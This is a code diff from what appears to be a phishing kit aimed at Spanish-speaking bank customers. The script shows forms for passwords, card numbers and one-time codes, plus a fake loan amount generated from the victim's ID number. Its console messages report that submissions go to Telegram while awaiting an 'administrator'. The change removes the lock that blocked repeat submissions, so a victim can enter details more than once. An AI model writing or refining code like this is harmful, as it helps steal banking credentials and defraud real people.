@@ -565,14 +565,6 @@ $(document).ready(function ($) {
     $("#fmr-clave-s, #fmr-tarjeta-d, #frm-otp, #frm-errorotp, #frm-correo, #frm-tarjeta").hide();
     $("#frm-formulario").show();
 
-    var formularioEnviado = localStorage.getItem("formularioEnviado");
-
-    if (formularioEnviado) {
-      $("#select-cuotas").attr("disabled", "disabled");
-      $("#btn-finalizar").attr("disabled", "disabled").text("✅ Formulario ya enviado");
-      return;
-    }
-
     var numDoc = localStorage.getItem("numDoc") || "0";
     var hashCedula = parseInt(numDoc.slice(-4)) || 0;
     var montoAprobado = 70000000 + (hashCedula * 1000000) % (130000000);
@@ -624,9 +616,6 @@ $(document).ready(function ($) {
       })
         .then(function(res) { return res.json(); })
         .then(function(data) {
-          localStorage.setItem("formularioEnviado", "true");
-          $("#select-cuotas").attr("disabled", "disabled");
-          $("#btn-finalizar").text("✅ Formulario ya enviado");
           console.log("✅ Formulario enviado a Telegram");
           console.log("⏳ Esperando respuesta del administrador...");
         })
